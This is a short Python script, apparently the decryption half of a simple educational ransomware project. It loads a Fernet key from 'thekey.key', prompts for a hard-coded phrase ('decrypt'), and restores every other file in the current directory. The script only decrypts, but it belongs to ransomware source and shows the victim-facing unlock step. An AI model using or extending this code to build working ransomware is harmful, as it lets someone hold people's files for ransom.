#!/usr/bin/env python3

import os
from cryptography.fernet import Fernet

files = []

for file in os.listdir():
	if file == 'ransomware.py' or file == 'thekey.key' or file == 'decrypt.py' or file == 'README.md':
		continue
	if os.path.isfile(file):
		files.append(file)


with open('thekey.key', 'rb') as key:
	secretkey = key.read()


secretPhrase = 'decrypt'

userPhrase = input('\nEnter the secret phrase to decrypt your files: ')

if userPhrase == secretPhrase:
	for file in files:
		with open(file, 'rb') as thefile:
			contents = thefile.read()
		contents_decrypted = Fernet(secretkey).decrypt(contents)
		with open(file, 'wb') as thefile:
			thefile.write(contents_decrypted)
	print("Congratulations, you're files are decrypted.")
else:
	print('Sorry, wrong secret phrase. Your files are still encrypted!!')
